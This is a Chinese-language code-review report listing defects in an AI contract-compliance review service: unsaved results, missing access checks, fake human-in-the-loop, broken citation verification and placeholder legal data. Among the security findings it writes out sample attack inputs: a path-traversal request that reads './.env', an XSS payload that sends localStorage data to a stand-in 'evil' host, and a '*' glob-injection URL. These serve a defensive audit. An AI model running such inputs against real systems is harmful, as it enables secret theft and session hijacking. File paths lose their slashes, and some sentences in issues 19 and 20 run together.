# 审查结果问题清单

## 一、问题清单（按严重性排序）

### 问题 1（致命・正确性）：审查结果从不落库，5 张核心表零写入 → 详情接口恒空、HITL 全线不可用

- **位置**：`appreview_service.py::get_review()`（205-278）
- **事实**：全库检索 `ComplianceRisk(` / `ComplianceRiskReference(` / `ComplianceReport(` / `ComplianceClause(` 只出现在 `models*.py` 的**类定义**处，没有任何 `db.add(...)`。合规模块所有写操作仅涉及 regulations / articles / playbooks / compliance_documents / compliance_reviews / human_actions。
- **影响**：
  1. `risks` 只活在 LangGraph state 与内存里，`GET /api/compliance/reviews/{id}` 的 `risks` 恒为 `[]`；
  2. 但 `high/medium/low_risk_count` 由 `_persist_status(..., **counts)`（`runtime.py:173`）写进了 review 行 → **计数非 0、清单为空**的自相矛盾展示；
  3. `POST /{id}/human-review` 按 `risk_id` 查 `ComplianceRisk`（`review_service.py:306`）→ 永远 `not found`，HITL 从 API 到前端（`viewscompliance.py:292`）全链路空转；
  4. `clause_id` / `playbook_rule_id` / `sort_order` / `page_number` 全部无从填充，**审查结论不可追溯、不可举证**——这对法务/合规产品是根本性缺陷；
  5. 报告只能靠磁盘 glob 找回，DB 与文件双源无一致性保证。
- **修复**：在 `generate_report` 之前新增一个 `persist_results` 节点（或在 `review_clauses` 末尾）用一个独立 Session 事务化写入：clauses → `ComplianceClause`；risks → `ComplianceRisk`（带 `clause_id`、`playbook_rule_id`、`sort_order`、`ai_confidence`）；refs → `ComplianceRiskReference`；报告落盘后写 `ComplianceReport(review_id, format, file_path, file_size)`。同时把 `get_review()` 里硬编码的 `"clause_number": None`（`review_service.py:241`）与 `key_info={}`（270）改为真实关联查询（`ComplianceKeyInfo`）。下载接口改为读 `ComplianceReport` 表而非 glob 文件系统。

### 问题 2（致命・安全）：合规模块全线缺失资源归属校验（IDOR），可审查并下载他人 private 文档

- **位置**：`apireviews.py:28-178`（5 个端点全部）、`servicesreview_service.py:61`（`db.query(Document).filter(Document.id == document_id).first()`）
- **事实**：`appdocument.py:31-32` 有 `uploaded_by` 与 `visibility("private"|"shared")`，且项目自身约定在 `appconversations.py:117/138/156/178/272` 一致执行 `if doc.uploaded_by != current_user.id and not current_user.is_superuser: 403`。**合规模块一处都没有做**。
- **影响**：任意登录用户只要拿到/枚举 `document_id`，即可①对他人的**私有合同**发起合规审查（LLM 抽取甲乙方、金额、违约金上限等敏感字段），②通过 `GET /reviews/{id}`（无归属校验）读取风险清单，③通过 `GET /reviews/{id}/report/{fmt}`（无归属校验）下载完整报告，④通过 `DELETE /reviews/{id}` 删除他人审查记录，⑤通过 `POST /{id}/human-review` 篡改他人风险等级（且 `risk_ids` 未校验是否属于该 `review_id`，可跨审查篡改）。属于横向越权 + 敏感数据外泄。
- **修复**：抽一个 `_assert_review_access(db, review_id, user)` 与 `_assert_document_access(db, document_id, user)` 依赖，在 `create_review` / `get_review` / `delete_review` / `human_review` / `内部工具_report` 五处强制调用；`human_action()` 增加 `ComplianceRisk.review_id == review_id` 过滤条件；`list_reviews` 的 superuser 分支与 `total` 口径统一（见问题 28）。

### 问题 3（致命・安全）：`POST /knowledge/regulations` 的 `file_path` 为服务端任意路径 → 可读取 `.env` 并经检索接口外泄密钥

- **位置**：`apiknowledge.py:98-147`（`req.file_path` → `knowledge_ingestion.ingest_from_file`）、`knowledgeingestion.py:151-188`（`load_document(str(p), _guess_mime(p))`）、`schemasregulation.py:18`（`file_path: str = ""`）
- **事实**：请求体里的 `file_path` 未经任何白名单/根目录 jail/存在性校验，直接交给 `app/rag/pipeline.load_document` 读盘；`_guess_mime()` 对未知后缀一律回退 `textplain`（`ingestion.py:205`），意味着**任何文本文件都能被读进来**。
- **影响**：攻击者提交 `{"title":"x","file_path":"./.env"}` 或 `/opt/zz-demand-system/.env`，即可把 `JWT_SECRET_KEY`、`LLM_API_KEY`、`DATABASE_URL`、`VECTOR_STORE_URL` 全文写入法规库，再用 `POST /knowledge/search`（任意登录用户可访问）逐条取回 → **完整的密钥泄露链**；也可读 `/etc/passwd`、私钥、其他租户上传目录。配合问题 5（该接口无 admin 限制），普通账号即可利用。
- **修复**：① 删除请求体里的 `file_path`，改为走既有 `POST /api/documents/upload` 的受控上传通道，服务端只接受自己签发的 `document_id`；② 若必须保留路径入参，则强制 `Path(base).resolve()` + `is_relative_to(settings.compliance_regulation_dir)` 校验，且拒绝符号链接与非常规后缀；③ 该配置项目前落盘目录 `compliance_regulation_dir` 定义了却从未使用（`config.py:158`），正好用它做 jail 根。

### 问题 4（致命・安全）：HTML 报告零转义 → 存储型 XSS，且与前端/API 同源返回

- **位置**：`reportinggenerator.py::render_html()`（38-253，尤其 54-71、75、104-124、141-149、156-169、176-253 全部 f-string 直插）；`apireviews.py:174-178`（`FileResponse(media_type="text/html; charset=utf-8")`）
- **事实**：全模块检索 `html.escape` / `markupsafe` / `bleach` / `autoescape` / `Jinja` **命中 0 次**；而 `pyproject.toml:50` 已声明 `jinja2>=3.1.0`，第 45 行注释明确写着"Jinja2 HTML 报告模板"——设计意图是模板引擎（默认自动转义），实现却退化成裸 f-string。被插入的 `title`（来自 `original_filename`，用户上传可控）、`summary`/`description`/`suggestion`（LLM 输出，受合同正文诱导）、`ref_content`、`clause content` 全部未转义。
- **影响**：在待审合同里放一句 `<img src=x onerror="fetch('//evil/'+localStorage.getItem('...'))">`，报告生成后由 `GET /reviews/{id}/report/html` 以 `text/html` 返回；按 README 的 Nginx 配置（`location /` → 8001，`location /streamlit/` → 8002，同一 `server_name`），报告与前端**同源**，脚本可窃取 Streamlit 会话/令牌并以受害者身份调用全部 API（含删库、改规则、下载他人报告）。同时 PDF 走 weasyprint 渲染同一段 HTML，也可能触发外部资源请求（SSRF 面）。
- **修复**：① 立刻用 Jinja2 `Environment(loader=FileSystemLoader(...), autoescape=select_autoescape(["html"]))` 重写模板，把所有变量改为 `{{ }}` 插值；② 下载响应强制 `Content-Disposition: attachment`、`X-Content-Type-Options: nosniff`、`Content-Security-Policy: default-src 'none'; sandbox`；③ 内联 CSS 抽到 `<style>` 常量并对 `original_filename` 做白名单字符过滤；④ weasyprint 渲染时禁用外部资源加载。

### 问题 5（致命・权限）：法规知识库写/删/种子接口只要"登录"即可，未要求 admin

- **位置**：`apiknowledge.py:98-103`（`ingest_regulation`，`current_user: User = Depends(get_current_user)`）、`163-168`（`delete_regulation`，`_: User = Depends(get_current_user)`）、`208-212`（`seed_regulations`）
- **对比**：`apiplaybooks.py:81/128/150/165` 全部正确使用 `Depends(require_roles("admin"))`；`appdependencies.py:69-80` 已提供该工厂。
- **影响**：任意 viewer 账号可篡改/清空**全公司共享的法律依据库**——删除全部法规后，所有后续审查报告将静默失去法规依据（`retrieval.search` 吞异常返回 `[]`，报告照出"合规"），也可注入伪造法条（配合问题 20 的占位数据风险）。这是合规系统最不该出现的权限洞。
- **修复**：三个写端点统一改 `Depends(require_roles("admin"))`；`GET /search`、`GET /regulations` 保留登录即可；另加审计日志（who/when/what）落 `compliance_human_actions` 同级的审计表。

### 问题 6（重要・安全）：报告下载用 `glob(f"review-{review_id}-*{ext}")`，通配符注入可下载任意人报告

- **位置**：`apireviews.py:138-178`，第 161-166 行
- **事实**：`review_id` 是未校验的路径参数，直接拼进 `Path.glob` 模式。请求 `/api/compliance/reviews/*/report/html` 时模式变成 `review-*-.html`，命中报告目录下**所有人**的文件，并按 mtime 取最新一份返回；`?`、`[a-z]` 等元字符同理可用。
- **影响**：绕过 UUID 不可猜的假设，一次性拿到最新生成的任意租户合同审查报告（含甲乙方、金额、违约金、风险结论）。叠加问题 2（无归属校验）即形成完整越权读取。
- **修复**：① 入口用 Pydantic/正则约束 `review_id` 为 UUID（`Path(..., regex=...)` 或 `UUID` 类型）；② 不用 glob，改为 `report_dir / f"review-{review_id}-{ts}.{ext}"` 精确拼接 + `resolve()` + `is_relative_to(report_dir)` 校验；③ 根本方案是查 `ComplianceReport` 表拿 `file_path`（见问题 1）。

### 问题 7（重要・正确性）：`parse` 失败后图仍继续执行，`failed` 会被后续节点覆盖成 `completed`

- **位置**：`workflowsreview_graph.py:40-43`（`g.add_edge("parse","supervise")` 无条件边）；`runtime.py:114-136`（`parse_document` 失败时 `return {**state, "status": STATUS_FAILED, ...}`）；`runtime.py:406-413`（`start_review` 取"最后一个带 status 的 update"作为终态）
- **影响**：文档解析失败（文件损坏、格式不支持、路径丢失）后，流水线照样跑 supervise/extract/review/reflect/generate_report，`_persist_status` 依次把状态改写为 `planning`→`reviewing`→…→`completed`，并生成一份"未检出风险项、合同合规"的报告。README 的状态机图（`parsing --> failed`）与实现不符。**失败被伪装成成功**，是合规场景最危险的错误类型。
- **修复**：把 `parse → supervise` 改为条件边 `should_continue_after_parse`，`status == failed` 直接 `END`；或在每个节点开头统一守卫 `if state.get("status") == STATUS_FAILED: return state`；同时 `start_review` 不要用"最后一个带 status 的 update"推断终态，改用 `self.graph.get_state(config).values`（也顺带修掉问题 11）。

### 问题 8（重要・正确性/架构）：法规检索与引用强制校验（防幻觉核心）整条链路未接线

- **位置**：`runtime.py:73`（`self._rag_skill = RagSkill()` —— 全库唯一一处引用）、`runtime.py:159-174`（`review_clauses` 只调 `_playbook_skill` 与 `_risk_skill`）；`agentsresearcher.py`（`ResearcherAgent` 仅在 `agents__init__.py` 被导出）；`knowledgecitation_verifier.py::verify_references`（仅被 `rag_skill.py:68` 与 `researcher.py:52` 调用，二者皆不可达）
- **事实**：README 的 LangGraph 流程图明确画了 `RiskSkill → RagSkill（法规条文检索 + 引用校验）→ ReviewerAgent`，`agentssupervisor.py:22` 的 `DEFAULT_PLAN` 也写着"法规引用检索与强制校验"，但图中**没有 research/rag 节点**。同时 `risk_skill` 调用时未传 `regulation_hits`（`runtime.py:166`），`ReviewerAgent.review_all` 的 `regulation_hits` 恒为 `None`（`reviewer.py:136`）。
- **影响**：报告里的"法规依据"完全来自 `agentsreviewer.py:57-62` 的 `_hit_to_risk()`——把 Playbook 规则的 `legal_basis_ref`（一个字符串线索，如"劳动合同法第十九条"）当 `ref_name`，把 `standard_position`（**企业自己的立场文本**）当 `ref_content` 塞进法条原文位置，`ref_type` 标成 `"playbook"`。于是：① 从未真正检索过法规库；② 从未做过逐字校验，`verified` 字段永远缺省 → HTML 报告恒显示"⚠ 需人工核实"（`generator.py:102`），Word 报告恒显示"⚠️ 待核实"；③ **企业内规被当作法条原文渲染在报告的"法规附录"里**（`word_exporter.py::_render_appendix`），对法务使用者构成实质性误导。
- **修复**：在图中补 `research` 节点（`review → research → reflect`），职责：对每条 risk 以 `description + clause content` 为 query 调 `RagSkill`（或 `ResearcherAgent.research`）→ 把命中写入 `regulation_hits[clause_number]` 供 `ReviewerAgent` 使用 → 对 LLM/规则产出的 `legal_references` 调 `verify_references` 回写 `verified`/`needs_human_check`。并把 `_hit_to_risk` 的 `ref_type="playbook"` 与 `ref_content=standard_position` 拆开：Playbook 线索归 `suggestion_reason`，法规引用必须来自检索命中，无命中则**不产出引用**而不是伪造。

### 问题 9（重要・正确性）：Word 导出与报告数据契约不一致 → 文件名恒为 `unknown`（永远下载不到）+ 风险统计恒为 0（假"合同合规"）

- **位置**：`reportinggenerator.py:282`（`export_word(report_data, str(report_dir))`）vs `exportersword_exporter.py:40-49`（`review_data.get("review_id","unknown")`、`high_risk_count`、`doc_type`、`completed_at`）、`word_exporter.py:170-172`（文件名 `compliance_report_{review_id[:8]}_{...}.docx`）；数据来源 `agentsreporter.py:119-128` 返回的键是 `summary/doc_info/key_info/risk_counts/risks/clauses/highlights/quality_score`
- **影响**（两个都是硬故障）：
  1. `report_data` 里**没有** `review_id` → 落盘文件名恒为 `compliance_report_unknown_YYYYmmdd_HHMMSS.docx`，而下载接口 glob 的前缀是 `review-{review_id}-`（`apireviews.py:161`）→ **Word 报告 100% 返回 404**；且多次审查文件名相互覆盖/堆积。仓库里已提交的产物 `datacompliance_report_test001_*.docx` 正是这个命名，可作为佐证。
  2. `report_data` 里**没有** `high_risk_count/medium_risk_count/low_risk_count`（只有 `risk_counts` 字典）→ Word 封面恒显示"🔴 0 🟡 0 🟢 0 合计 0"，执行摘要恒为"**本次审查未检出风险条款，合同合规。**"（`word_exporter.py:74-76`），而同一份数据的 HTML 报告却列出 N 条高风险。**同一审查两份报告结论相反**，在法务场景是可直接导致错误签署的假阴性。
  3. `doc_type`、`completed_at` 同样缺失 → 封面显示"—"和 `datetime.utcnow()`（该方法在 3.12+ 已弃用，且与全项目 timezone-aware 写法混用）。
- **修复**：统一契约——要么让 `export_word` 接收 `ReporterAgent` 的 `report_data` 结构（改读 `risk_counts["high"]` 等、`doc_info["doc_type"]`），要么在 `generate_reports_for_review` 里显式构造一个 `WordExportContext`（含 `review_id`/`completed_at`/三级计数）并让文件名由调用方传入（`out_path` 参数），禁止 exporter 自己拼名字。补一条契约测试断言三个 exporter 消费同一个 Pydantic 模型。

### 问题 10（重要・正确性）：`template_id` 与 `contract_type_override` 从未进入初始 state → 模板比对与类型覆盖静默失效

- **位置**：`runtime.py::start_review()` 的 `initial` 字典（391-402）只含 `review_id/document_id/compliance_doc_id/file_path/mime_type/user_id/rules/original_filename/status/retry_count`；对比 `workflowsstate.py:62-63` 声明了 `template_id`、`contract_type_override`；`should_compare()`（338-345）与 `supervise()`（141-143）都在读这两个键
- **影响**：① API 接受并存库的 `template_id`（`apireviews.py:46`、`ComplianceReview.template_id`）永远传不到图里 → `should_compare` 只能靠"规则是否配了 `standard_position`/`suggested_clause`"这种间接信号决定是否走 compare 分支，**用户显式指定的模板比对被忽略**；② `contract_type_override` 在 `supervise` 里恒为 `None`，Supervisor 的"类型复核"永远拿不到用户意图；③ 规则集早在 `create_review` 阶段就按 `doc_type or "labor_contract"` 固定了（`review_service.py:103-104`），而 `ParseSkill` 之后算出的真实 `doc_type`（`runtime.py:132`）**不会回头重选规则** → 自动分类结果对审查范围毫无影响。
- **修复**：`start_payload`（`review_service.py:122-131`）补 `template_id`、`contract_type_override`；`start_review` 签名与 `initial` 同步补齐；并在 `supervise` 节点里根据 `parse` 得到的 `doc_type` 重新加载规则（把 `_load_active_rules` 下沉为可在图中调用的能力），否则"文档分类"这一步只是装饰。

### 问题 11（重要・正确性）：`ReviewState` 未声明节点实际写入的键 → 条件边读不到数据，低置信分支永久失效

- **位置**：`workflowsstate.py:48-95`（`ReviewState` 声明）vs `runtime.py:210-217`（`reflect` 返回 `coverage_score`、`avg_confidence`）、`runtime.py:260-272`（`compare_template` 返回 `template_deviations`、`highlow_risk_count`）、`runtime.py:349-355`（`should_retry` 读 `state.get("avg_confidence")`）
- **事实**：LangGraph 按 `StateGraph(ReviewState)` 的注解建通道，节点返回**未在 schema 声明的键不会传递给下游**（部分版本还会抛 `InvalidUpdateError`）。`avg_confidence`、`coverage_score`、`template_deviations`、三级计数都不在 `ReviewState` 里；`state.py` 声明的 `template_diff`、`review_summary`、`report_id`、`human_decisions` 则从未被任何节点写入。
- **影响**：`should_retry()` 中 `avg_conf = float(state.get("avg_confidence") or 0.5)` 恒为 `0.5`，`low_conf` 判据（`avg_conf < 0.6 and clauses and not risks`）虽然凑巧成立，但**永远拿不到真实置信度**；模板偏离数无法进入报告；schema 与实现双向漂移，后续维护者无法从 `state.py` 推断真实数据流。
- **修复**：以节点实际读写字段为准重建 `ReviewState`（补 `coverage_score`、`avg_confidence`、`template_deviations`、三级计数、`regulation_hits`、`citation_verified_ratio`），删掉从不写入的字段；对需要累加的列表（如重试期间的 risks 历史）用 `Annotated[list, operator.add]` 显式声明 reducer——`state.py:16-18` 的注释已经意识到这点但没落地。

### 问题 12（重要・正确性/产品风险）：规则库为空或无命中时，报告输出"未检出风险项 / 合同合规"，无覆盖率告警

- **位置**：`servicesreview_service.py:134-150`（`_load_active_rules` 无规则时回退"所有 active 规则"，仍可能为空）、`runtime.py:176-197`（`reflect`：`clauses and not risks → coverage_score=0.4`）、`agentsreporter.py:52-53`（`verdict = "未检出风险项。"`）、`word_exporter.py:74-76`（"合同合规"）
- **事实链**：Playbook 种子只能通过 CLI 脚本 `python -m app.compliance.scripts.seed_playbooks` 导入（`scriptsseed_playbooks.py`，全库无调用方）；README 宣称 `POST /api/compliance/knowledge/seed` 会"一键初始化 **Playbook 默认规则** + 4 部核心法规"，但该端点（`apiknowledge.py:208-254`）**只写法规、不写规则**。于是新部署默认 `rules=[]` → `match_rules_for_clauses` 无命中 → `risks=[]` → `quality=0.45-decay < 0.7` → 空转重试到上限 → 生成一份"未检出风险项"的报告。
- **影响**：**系统把"我没有规则/我没查"表达成"这份合同合规"**。这是合规产品最不可接受的失败模式（假阴性 + 结论性措辞）。
- **修复**：① 报告与 API 引入显式的 `coverage` / `review_completeness` 字段与三态结论：`存在风险` / `未发现风险（覆盖率 X%，规则数 N，法规库 M 部）` / `审查不充分，无法出具结论`；当 `rules == 0` 或 `coverage_score < 阈值` 或法规库为空时，**禁止输出"合规"字样**并把 review 置为 `completed_with_warnings`；② `_load_active_rules` 的"回退到全部 active 规则"（145-150）应改为显式失败或至少写入 `error_message`，跨合同类型套用规则会制造错误风险点；③ 补 `POST /api/compliance/playbooks/seed`（admin）并在 README 修正描述；④ 首次启动若规则库为空，在 `/api/health` 或启动日志给出 WARN。

### 问题 13（重要・架构）：HITL 是"假人在环"——无 interrupt、无 resume、决策入口零调用、审核意见不落库

- **位置**：`harnesshitl.py:32-39`（`should_pause` 全库零调用）、`41-106`（`record_human_action` 全库零调用）、`108-115`（`build_resume_command` 占位）；`runtime.py:274-287`（`human_review` 节点只 `_persist_status` + 收集条款号，docstring 声称"调 `record_human_action()` 留痕"与实现不符）；`review_service.py:290-346`（真正被调用的 `human_action`，与 `HitlManager` 逻辑重复实现两遍）
- **事实**：全库检索 `interrupt(`、`Command(` 命中 0（`hitl.py:111` 只是注释）；`graph.get_state` 命中 0。`human_review` 节点执行完直接 `add_edge("human_review","generate_report")`（`review_graph.py:61`），不暂停。
- **额外缺陷**：`human_action()` 接受 `note` 参数（`apireviews.py:123`）却**从不写 `risk.human_note`**（对比 `hitl.py:70` 有写），法务的审核意见被静默丢弃；`action` 为未知值时执行 `db.close()` 再 raise（`review_service.py:327-328`）——关闭的是 `Depends(get_db)` 注入的会话，属于跨层资源管理错误，且未 `rollback`；`action`/`new_risk_level` 在 schema 里是裸 `str`（`schemasreview.py:145-152`），未用已定义的 `RiskLevel` 枚举校验，可写入 `"critical"`/超长值（`ComplianceRisk.risk_level` 是 `String(10)`，PG 下直接 500）。
- **修复**：① `human_review` 节点改用 `langgraph.types.interrupt(payload)` 真正暂停，API 侧用 `Command(resume=decisions)` + 同一 `thread_id` 恢复（checkpointer 已具备条件，见问题 15）；② 合并两套 HITL 实现，`ReviewService.human_action` 调 `HitlManager.record_human_action`，消除重复；③ `note` 落 `human_note`，`old_value/new_value` 用 JSON 而非 `str(dict)`（`review_service.py:338-339` 当前存的是 Python repr，无法机读审计）；④ `action` 改 `Literal[...]`、`new_risk_level` 改 `RiskLevel`；⑤ 去掉 `db.close()`，改为 `raise HTTPException`/`ValueError` 由依赖统一收尾。

### 问题 14（重要・正确性）：自反思是"伪反思"——重跑同一确定性节点、无反馈注入、衰减项单调降质

- **位置**：`runtime.py:176-217`（`reflect`）、`runtime.py:347-362`（`should_retry`）、`review_graph.py:55-59`（`retry → review`）
- **事实**：`review` 节点是纯函数式的（同样 `clauses` + 同样 `rules` → 同样 `risks`），重试时**不注入任何新信息**（没有"上一轮遗漏了什么"的 critique、没有降低匹配阈值、没有扩大 top_k、没有换 prompt）；而 `decay = max(0.0, 0.15 * retry_count)`（196 行）让 `quality` 每轮**单调下降**（197 行）。
- **影响**：① 只要首轮 `quality < 0.7`，就必然连续重试到 `max_retry`，每轮结果完全相同 → 纯粹浪费；LLM 模式下等于**把整份合同的逐条 LLM 调用重复 3 遍**（成本×3、时延×3）；② `retry <= max_retry`（356 行）配合 `reflect` 里的 `next_retry = retry_count + 1`（198 行）构成 off-by-one，实际最多跑 `max_retry + 1` 轮重试；③ `coverage_score` 只有 0.2/0.4/1.0 三档，`avg_conf` 在无风险时硬编码 0.5，都不是真实质量度量；④ 无"重试后仍不达标"的终态处理，直接落到报告生成（回到问题 12）。
- **修复**：把 reflect 变成真正的 critic：输出结构化的 `reflection`（遗漏的条款类型、低置信项、未覆盖的 Playbook 规则），作为 state 字段注入下一轮 `review`（例如仅对未覆盖条款重审、放宽阈值、追加法规检索）；`decay` 改为"重试预算惩罚"而非质量惩罚，或去掉；判据改 `retry < max_retry`；重试仍不达标 → `status = completed_with_warnings` 并在报告中显式声明覆盖率。

### 问题 15（重要・架构/Harness）：崩溃不可恢复——BackgroundTasks 无队列、无超时、无 stuck 回收，Checkpointer 只写不读

- **位置**：`apireviews.py:51`（`background_tasks.add_task(service.run_review, payload)`）、`runtime.py:404-426`（同步 `graph.stream` 循环，无 timeout）、`harnessmain.py:70-87`（`_recover_stuck_documents` 只恢复 documents，**没有对应的 review 恢复**）
- **影响**：① 进程重启/崩溃后，正在跑的审查永久停在 `parsing`/`reviewing`，前端进度条永远转圈，无重试、无告警；② `PostgresSaver.setup()` 建了 checkpoint 表、每个 super-step 都在写，但**没有任何 `get_state()` / `Command(resume=)` / `get_state_history()` 调用** → 断点续跑、时间旅行、HITL 恢复三项能力全部为零，checkpointer 纯粹是写放大；③ 无 PG 时回退 `InMemorySaver`（78 行）在多 worker（uvicorn `--workers>1` / gunicorn）下检查点跨进程不可见，且进程退出即丢；④ 无并发闸门：一次审查在 LLM 模式下是数十次串行调用，全部落在 Starlette 线程池（默认 40），几十个并发审查即可耗尽线程池，**连带拖死 RAG 问答**；⑤ 无单任务超时/取消/预算上限；⑥ `pyproject.toml:33` 已声明 `celery>=5.4.0`、`config.py:113-116` 已有 `celery_broker_url`/`use_celery_task`，却没被合规模块使用。
- **修复**：① 审查任务改投 Celery/arq 队列（复用已有依赖与配置），带 `acks_late`、重试退避、`time_limit`/`soft_time_limit`；② 启动时增加 `_recover_stuck_reviews()`：把 `status in (parsing,planning,reviewing,reflecting,comparing,generating)` 且 `started_at` 超阈值的任务重置为 `pending` 并重新入队（利用 `thread_id` 从 checkpoint 续跑）；③ 生产强制 `PostgresSaver`，`InMemorySaver` 仅允许 test/dev 且打 WARN；④ `start_review` 外包一层 `concurrent.futures` 超时或 LangGraph `recursion_limit`；⑤ 增加 `POST /reviews/{id}/cancel`。

### 问题 16（重要・正确性）：法规入库不写向量（inline articles 与 `/seed` 两条主路径）→ 入库了却检索不到

- **位置**：`apiknowledge.py:269-280`（`_ingest_articles_json` 只 `db.add(ComplianceRegulationArticle)`，**无 `add_regulations_to_store`**）、`apiknowledge.py:130-135`（inline articles 路径）、`208-254`（`/seed` 路径，自己重写了一遍摄入逻辑）；对照 `knowledgeingestion.py:138-141`（正确路径：commit 后 `add_regulations_to_store(vec_docs)`）与 `knowledgeseed_data.py:40-88`（`load_seed_regulations` 走正确路径，但**全库零调用**）
- **影响**：README 推荐的第一步"`POST /api/compliance/knowledge/seed` 一键初始化 4 部核心法规"执行后，`compliance_regulations` + `compliance_regulation_articles` 有数据、列表接口能看到，但 PGVector 里**一个向量都没有** → `POST /knowledge/search` 恒返回空、`RegulationSearchResponse.hits=[]`。即使将来把 RagSkill 接上（问题 8），也检索不到任何法条。两条实现（API 内联 vs `ingestion.py`）还存在细节分叉：`sort_order` 一个从 1 起（`apiknowledge.py:278`）一个从 0 起（`ingestion.py:132`）；重名处理一个 409 拒绝（`apiknowledge.py:110`）一个删旧重建（`ingestion.py:100-107`）。
- **修复**：`apiknowledge.py` 的三个写端点全部改为调用 `knowledgeingestion.py::ingest_regulation` 与 `knowledgeseed_data.py::load_seed_regulations`，删除内联重复实现（同时激活 `servicesregulation_service.py`，见问题 27）；补一条集成测试断言"摄入后 `search_regulations` 能召回该条"。

### 问题 17（重要・算法）：引用校验用 `SequenceMatcher.ratio()` 整串比对 + 默认 autojunk → 正确的逐字引用也会判 False

- **位置**：`knowledgecitation_verifier.py:40-42`（`text_similarity`）、`45-86`（`verify_citation`，阈值 `settings.compliance_citation_similarity_threshold = 0.95`，`config.py:151`）
- **事实**：`ratio() = 2*M / (len(a)+len(b))`。法条原文通常 100~500 字，而引用摘录往往只取其中一句（30~80 字），即使**逐字完全一致**，ratio 也只有 0.3~0.6，远低于 0.95 → 恒判 `verified=False`。另外 `SequenceMatcher(None, a, b)` 的 `autojunk` 默认为 True，对长度 > 200 的串会把高频字符当 junk，中文法条（大量"的/人/单/位"）结果进一步失真。第 68-71 行还对 < 10 字的引用直接判 False。
- **影响**：防幻觉机制一旦接线（问题 8）就会**100% 误杀真实引用**，报告里所有法条都挂"需人工核实" → 告警疲劳 → 人工直接忽略该标记，机制形同虚设；反之若有人为了"让校验通过"把阈值调低（如 0.3），又会放行真正的幻觉引用。
- **修复**：改为**包含性 + 局部对齐**判定：① 先做归一化子串包含检查（`ref_norm in article_norm` → 直接 verified）；② 否则用滑动窗口/`SequenceMatcher.find_longest_match` 或 `difflib` 的 `get_matching_blocks` 计算"引用被原文覆盖的比例"（`coverage = 匹配字符数 / len(ref_norm)`），阈值对 coverage 而非 ratio 生效；③ 显式 `SequenceMatcher(None, a, b, autojunk=False)`；④ 长文本可先用 `rapidfuzz.partial_ratio`（需加依赖）；⑤ 校验结果分级：`verified` / `partial`（覆盖 60~95%）/ `unverified`，报告分别渲染，而不是一刀切。

### 问题 18（重要・数据一致性）：法规摄入非原子，"先删旧再重建"失败即数据丢失

- **位置**：`knowledgeingestion.py:100-107`（删旧向量 + 删旧条款 + `session.delete(existing)` + commit）、`138-141`（先 commit 元数据，**再**在事务外 `add_regulations_to_store(vec_docs)`，且无 try/except）
- **影响**：① 向量化失败（embedding API 限流/超时、PG 连接抖动、维度不符）时，法规行与条款行已提交但**没有向量** → 出现"库里有、检索不到"的幽灵法规（正是问题 16 的另一种触发路径），且异常向上抛出后无回滚、无补偿、无状态标记；② 重新摄入同名法规时，旧向量与旧条款**已经被删掉**，若新数据向量化失败 → 该法规彻底消失，无法回退；③ 幂等键是 `title` 精确匹配（97 行），"中华人民共和国劳动合同法"与"劳动合同法（占位）"会被当成两部法规并存 → 重复召回、引用来源混乱；④ `content` 为空的条款只入库不入向量（136 行），检索覆盖出现静默空洞。
- **修复**：① 引入 `ComplianceRegulation.index_status`（`pending/indexed/failed`）+ `indexed_at`，向量化失败置 `failed` 并保留旧版本；② 采用"先写新、后删旧"的蓝绿式替换，或把删旧与写新放进同一事务 + 向量写入失败时回滚 DB；③ 提供 `POST /knowledge/reindex`（admin）做补偿重建；④ 幂等键改为 `(title, version)` 或规范化标题（去"（占位）"等后缀）+ 唯一约束；⑤ 空 `content` 直接拒绝入库（422）。

### 问题 19（重要・契约）：前后端字段错位——前端传的 `doc_type`、API 读的 `original_filename` 都不在 schema 里，被 Pydantic 静默丢弃

- **位置**：`appcompliance.py:39-44`（`payload["doc_type"] = doc_type`）vs `schemasreview.py:100-103`（`ReviewCreateRequest` 只有 `document_id`reviews.py:38`（`getattr(req, "original_filename", None)` —— schema 中无此字段）
- **影响**：① 用户在审查页选择的合同类型**永远传不到后端**（Pydantic 默认忽略额外字段），所有审查一律按 `labor_contract` 取规则（`review_service.py:103`）→ 审 NDA 时套劳动合同规则；② `original_filename` 恒为 `None` → 回退成 `f"doc-{req.document_id}"`（`apireviews.py:38`），仓库里已提交的报告标题正是 `doc-b44ee52a-6b0c-4bd7-963c-a9100cc2268d — 合规审查报告`，可作实证；③ README 的 `POST /reviews` 示例还带了 `playbook_id`，schema 里同样没有 → 用户按文档操作会被静默忽略。
- **修复**：① 前后端字段对齐：`ReviewCreateRequest` 增 `original_filename`（或直接由服务端从 `Document.original_filename` 取，不要信任客户端），把 `doc_type` 统一为 `contract_type_override`；② 给所有请求模型加 `model_config = ConfigDict(extra="forbid")`，让契约错误在开发期就 422 暴露，而不是静默吞掉——这一条建议对整个 `app/compliance/schemas/*` 生效；③ 同步修正 README 的 curl 示例（见问题 32）。

### 问题 20（重要・数据/合规风险）：种子法规库含"占位/杜撰"法条文本，会被当作真实法律依据引用

- **位置**：`app/compliance/knowledge/seed_data/labor_contract/劳动合同法.json`（`title = "中华人民共和国劳动合同法（占位）"`，2 条 articles，正文以"**【占位示例条文，真实全文待补】**"结尾）；`seed_data.py:15` 的注释也自认"MVP 阶段这些 JSON 多为占位骨架"
- **影响**：一旦 `/seed` 或 `load_seed_regulations` 生效（问题 16 修好后必然生效），系统会在正式审查报告的"法规依据/法规附录"中引用**带占位标记的非真实法条**；而《劳动法》只入了 23 条（实际 107 条）、《劳动合同法实施条例》12 条、司法解释（一）23 条，覆盖率严重不足 → 检索大面积漏召回，叠加问题 12 的"无命中即合规"逻辑，结论不可信。对法务用户而言，引用错误法条比不引用更危险。
- **修复**：① 种子数据加 `is_placeholder: bool` / `data_quality` 字段，占位数据**禁止进入生产库**（或在报告中强制标注"示例数据，非有效法律依据"）；② 用权威来源（国家法律法规数据库）导入全文并记录 `source` + `version` + `effective_date`；③ 检索层增加时效过滤：`retrieval.search()` 目前接受 `regulation_type` 但从不按 `effective_date`/`expire_date`/`status` 过滤（`knowledgeretrieval.py:37-72`、`vector_store.py:133-154` 支持 `status` 却没被传），**已废止researcher.py:4` 承诺的"法规有效性检查"从未实现；④ 报告页脚固定声明法规库版本与检索时间。

### 问题 21（一般・正确性）：Playbook 引擎只有"关键词出现"语义，没有"违规判定"语义；阈值与 LLM 层是空壳

